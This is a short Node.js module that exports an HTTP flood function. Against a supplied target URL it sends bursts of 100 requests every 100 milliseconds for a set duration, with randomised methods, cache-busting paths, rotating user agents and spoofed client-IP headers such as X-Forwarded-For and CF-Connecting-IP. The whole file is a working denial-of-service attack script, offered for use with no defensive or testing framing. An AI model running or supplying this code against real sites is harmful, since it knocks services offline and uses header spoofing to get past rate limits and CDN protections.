const https = require("https");
const http = require("http");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (X11; Linux x86_64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "curl/7.68.0",
  "Wget/1.20.3"
];

const methods = ["GET", "POST", "HEAD", "OPTIONS", "TRACE"];

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join(".");
}

function randomHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "Referer": `https://${hostname}/?r=${Math.random().toString(36)}`,
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "CF-Connecting-IP": ip,
    "True-Client-IP": ip,
    "Cookie": `session=${Math.random().toString(36).substring(2)}`
  };
}

module.exports = function (target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function spinAndSend() {
    const method = methods[Math.floor(Math.random() * methods.length)];
    const headers = randomHeaders(url.hostname);
    const path = url.pathname + "?" + Math.random().toString(36).substring(2);

    const options = {
      method,
      hostname: url.hostname,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      path,
      headers
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] ${method} to ${url.hostname}`);
      res.on("data", () => {});
    });

    req.on("error", err => {
      console.error(`[ERR] ${method} -> ${err.code || err.message}`);
    });

    if (method === "POST") {
      req.write("param=" + Math.random().toString(36));
    }

    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 100; i++) spinAndSend();
    setTimeout(loop, 100);
  }

  loop();
};
